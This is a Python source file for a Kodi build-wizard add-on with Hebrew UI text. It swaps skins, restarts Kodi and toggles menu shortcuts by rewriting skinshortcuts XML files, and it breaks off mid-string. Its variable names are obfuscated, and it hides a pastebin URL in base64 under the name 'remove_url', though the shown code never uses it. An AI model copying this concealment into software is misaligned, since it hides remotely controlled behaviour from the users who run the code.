# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	O00O00O00O0000000 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O0OOO0O00O0O00OO0 =[];OOO0000OO00OO0OOO =[]#line:261
	for OOOOOOOO00O000000 in sorted (O00O00O00O0000000 ,key =lambda O0O0OO000O0OOOO00 :O0O0OO000O0OOOO00 ):#line:262
		O0OOOOOOO0OOOO00O =os .path .split (OOOOOOOO00O000000 [:-1 ])[1 ]#line:263
		OOO0O0OOO0OO0OO0O =os .path .join (OOOOOOOO00O000000 ,'addon.xml')#line:264
		if os .path .exists (OOO0O0OOO0OO0OO0O ):#line:265
			OOOOO00000OOOO000 =open (OOO0O0OOO0OO0OO0O )#line:266
			O000OOOO0O00O00OO =OOOOO00000OOOO000 .read ()#line:267
			O00OO000000O0O000 =parseDOM2 (O000OOOO0O00O00OO ,'addon',ret ='id')#line:268
			OOOO0O00OO0O000OO =O0OOOOOOO0OOOO00O if len (O00OO000000O0O000 )==0 else O00OO000000O0O000 [0 ]#line:269
			try :#line:270
				OO0OO00O0000O0OOO =xbmcaddon .Addon (id =OOOO0O00OO0O000OO )#line:271
				O0OOO0O00O0O00OO0 .append (OO0OO00O0000O0OOO .getAddonInfo ('name'))#line:272
				OOO0000OO00OO0OOO .append (OOOO0O00OO0O000OO )#line:273
			except :#line:274
				pass #line:275
	O0OO000OO0O0O0000 =[];O0000O00O0OO0O000 =0 #line:276
	OO00000OOO0OOO000 =["Current Skin -- %s"%currSkin ()]+O0OOO0O00O0O00OO0 #line:277
	O0000O00O0OO0O000 =DIALOG .select ("Select the Skin you want to swap with.",OO00000OOO0OOO000 )#line:278
	if O0000O00O0OO0O000 ==-1 :return #line:279
	else :#line:280
		O0O00OOOO0000O000 =(O0000O00O0OO0O000 -1 )#line:281
		O0OO000OO0O0O0000 .append (O0O00OOOO0000O000 )#line:282
		OO00000OOO0OOO000 [O0000O00O0OO0O000 ]="%s"%(O0OOO0O00O0O00OO0 [O0O00OOOO0000O000 ])#line:283
	if O0OO000OO0O0O0000 ==None :return #line:284
	for O0OOOOO00OO000000 in O0OO000OO0O0O0000 :#line:285
		swapSkins (OOO0000OO00OO0OOO [O0OOOOO00OO000000 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OOO00O00O00000OOO ,title ="Error"):#line:290
	OOO0O00O0000OO000 ='lookandfeel.skin'#line:291
	OO0O0OOO00000O00O =OOO00O00O00000OOO #line:292
	O000OOOOOOO0O0O0O =getOld (OOO0O00O0000OO000 )#line:293
	O00OO0000OO0OOOOO =OOO0O00O0000OO000 #line:294
	setNew (O00OO0000OO0OOOOO ,OO0O0OOO00000O00O )#line:295
	O0OO000O00000O0OO =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO000O00000O0OO <100 :#line:297
		O0OO000O00000O0OO +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (OO00OOOOO0OO0000O ):#line:304
	try :#line:305
		OO00OOOOO0OO0000O ='"%s"'%OO00OOOOO0OO0000O #line:306
		OO0OOOOO000O0OOOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO00OOOOO0OO0000O )#line:307
		O00O00OOOOO00OO0O =xbmc .executeJSONRPC (OO0OOOOO000O0OOOO )#line:309
		O00O00OOOOO00OO0O =simplejson .loads (O00O00OOOOO00OO0O )#line:310
		if O00O00OOOOO00OO0O .has_key ('result'):#line:311
			if O00O00OOOOO00OO0O ['result'].has_key ('value'):#line:312
				return O00O00OOOOO00OO0O ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (OOO0OO00000O0OO0O ,O0O0OOO0O0000OOOO ):#line:319
	try :#line:320
		OOO0OO00000O0OO0O ='"%s"'%OOO0OO00000O0OO0O #line:321
		O0O0OOO0O0000OOOO ='"%s"'%O0O0OOO0O0000OOOO #line:322
		OO0OOOO00OOO0O0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0OO00000O0OO0O ,O0O0OOO0O0000OOOO )#line:323
		O00OO0O0OOOO0OOO0 =xbmc .executeJSONRPC (OO0OOOO00OOO0O0O0 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			O0OO000O00O000OO0 =xbmcgui .DialogProgress ()#line:334
			O0OO000O00O000OO0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים![/B][/COLOR]")#line:337
			O0OO000O00O000OO0 .update (0 )#line:338
			for O0OOOO00O00OO00OO in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				O0OO000O00O000OO0 .update (int ((5 -O0OOOO00O00OO00OO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOOO00O00OO00OO ),'')#line:341
				if O0OO000O00O000OO0 .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			O0OO000O00O000OO0 =xbmcgui .DialogProgress ()#line:347
			O0OO000O00O000OO0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים![/B][/COLOR]")#line:350
			O0OO000O00O000OO0 .update (0 )#line:351
			for O0OOOO00O00OO00OO in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				O0OO000O00O000OO0 .update (int ((5 -O0OOOO00O00OO00OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOOO00O00OO00OO ),'')#line:354
				if O0OO000O00O000OO0 .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:364
			skin_lower ()#line:365
def rdoff ():#line:367
	resloginit .resloginit ('restore','all')#line:369
	O0O000O000O0O00OO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:370
	OO0OO00OOOO0O000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:371
	copyfile (O0O000O000O0O00OO ,OO0OO00OOOO0O000O )#line:372
def rdon ():#line:374
	loginit .loginIt ('restore','all')#line:375
	OOOOOO00OOO0O0000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:377
	OO0OOOOO00O0O00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:378
	copyfile (OOOOOO00OOO0O0000 ,OO0OOOOO00O0O00OO )#line:379
def adults18 ():#line:381
  OOOOOOOO00000O00O =(ADDON .getSetting ("adults"))#line:382
  if OOOOOOOO00000O00O =='true':#line:383
    O0OO000000O0OO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:384
    with open (O0OO000000O0OO00O ,'r')as O0O0O00O0OO0OOO0O :#line:385
      O00O000O00OO00O0O =O0O0O00O0OO0OOO0O .read ()#line:386
    O00O000O00OO00O0O =O00O000O00OO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:404
    with open (O0OO000000O0OO00O ,'w')as O0O0O00O0OO0OOO0O :#line:407
      O0O0O00O0OO0OOO0O .write (O00O000O00OO00O0O )#line:408
def rdbuildaddon ():#line:409
  O0O0O000OO0OOO000 =(ADDON .getSetting ("rdbuild"))#line:410
  if O0O0O000OO0OOO000 =='true':#line:411
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:412
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:413
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:414
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:432
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:435
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:436
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:440
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:441
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:442
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:460
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:463
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:464
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:468
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:469
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:470
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:488
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:491
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:492
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:496
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:497
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:498
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:516
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:519
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:520
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:523
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:524
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:525
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:543
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:546
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:547
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:549
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:550
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:551
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:569
    with open (OOOOO000O00O0O0OO ,'w')as OO0O0OO0O00O0O000 :#line:572
      OO0O0OO0O00O0O000 .write (OO0O0OOO0O0O0OO0O )#line:573
    OOOOO000O00O0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:575
    with open (OOOOO000O00O0O0OO ,'r')as OO0O0OO0O00O0O000 :#line:576
      OO0O0OOO0O0O0OO0O =OO0O0OO0O00O0O000 .read ()#line:577
    OO0O0OOO0O0O0OO0O =OO0O0OOO0O0O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
